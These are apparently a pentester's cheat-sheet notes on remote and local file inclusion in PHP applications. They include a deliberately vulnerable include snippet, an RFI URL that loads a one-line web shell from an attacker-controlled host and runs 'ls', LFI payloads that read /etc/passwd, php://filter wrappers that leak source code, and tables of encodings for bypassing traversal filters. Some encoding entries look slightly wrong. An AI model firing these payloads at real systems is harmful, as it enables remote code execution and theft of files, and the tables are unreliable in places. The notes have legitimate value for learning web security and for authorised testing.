### what && when
useful when developers want to incorporate external asset files like images into their applications, make use of external code libraries, or reuse code that is written for a different purpose. but when user control the included file that when the vulnerability happened
### types
### RFI (remote file inclusion)
occur when the application allows arbitrary files from a remote server to be included. php sample code
```php
<?php 
$f=$_GET["page"];
include $f;
?>
```
attacker can host following file `evil.txt` and pass the link to the vuln site: `http://site.com?page=http://atacker.com/evil.txt?c=ls`
```php
<?php system($_GET['c']);?>
```
### LFI (local file inclusion)
happen when applications include files in an unsafe way, attackers need to first upload a malicious file to the local machine, and then execute it by using local file inclusion
paylaos:
```
//basic 
http://example.com/index.php?page=../../etc/passwd 
http://example.com/index.php?page=../../etc/passwd%00 
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%2500 http://example.com/index.php?page=....//....//etc/passwd 
//Wrappers 
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php http://example.com/index.php?page=php%3A%2F%2Ffilter%2Fconvert%2Ebase64%2Dencode%2Fresource%3Dindex%2Ephp 

//IIS server with 
/// best fit 
	/cgi.pl/%E0dmin   -> /cgi.pl/admin 

	////`doc_root` directive configured
		/index.php/..¥..¥..¥windows/win.ini/
		/index.php/..¥..¥NONEXIST/
Can be chained with a compression wrapper. http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
```

##### bypass path traversal 
| char | url encoding | 16-bit unicode |
| ---- | ------------ | -------------- |
| .    | %2e          | %u002e         |
| /    | %2f          | %u2215         |
| \    | %5c          | %u2216         |
| /    | ¥            | U+00A5         |

| ../                  | `..\`                |
| -------------------- | -------------------- |
| %2e%2e%2f            | %2e%2e%5c            |
| `%2e%2e/ \|\| ..%2f` | `%2e%2e\ \|\| ..%5c` |
| ..%255c              | %252e%252e%255c      |
